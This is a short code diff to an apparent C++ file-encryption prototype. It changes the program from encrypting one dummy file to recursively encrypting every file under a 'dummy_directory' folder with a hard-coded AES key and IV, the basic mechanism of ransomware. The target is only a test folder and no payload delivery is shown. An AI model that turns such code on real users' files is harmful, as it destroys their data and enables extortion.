@@ -3,17 +3,29 @@
 #include <iostream>
 #include <fstream>
 #include <cstring>
+#include <filesystem>
 
 #define AES_BLOCK_SIZE 16
+
+using recursive_directory_iterator = std::filesystem::recursive_directory_iterator;
 
 void encryptFile(unsigned char key_chars[], unsigned char iv[], const char* filename);
 
 int main(){
+
+    std::filesystem::path myPath = "dummy_directory";
+    std::string file;
+
     unsigned char key_chars[] = "Hard-coded key here.";
     unsigned char iv[] = "some random IV value";
-    printf("Encrypting... \n");
-    encryptFile(key_chars, iv, "dummyfile.txt");
-    return 0;
+
+    for (const auto& dirEntry : recursive_directory_iterator(myPath)){
+        if (!dirEntry.is_directory()){
+            file = dirEntry.path().generic_string();
+            printf("encrypting %s... \n", file.c_str());
+            encryptFile(key_chars, iv, file.c_str());
+        }
+    }
 }
 
 void encryptFile(unsigned char key_chars[], unsigned char iv[], const char* filename){
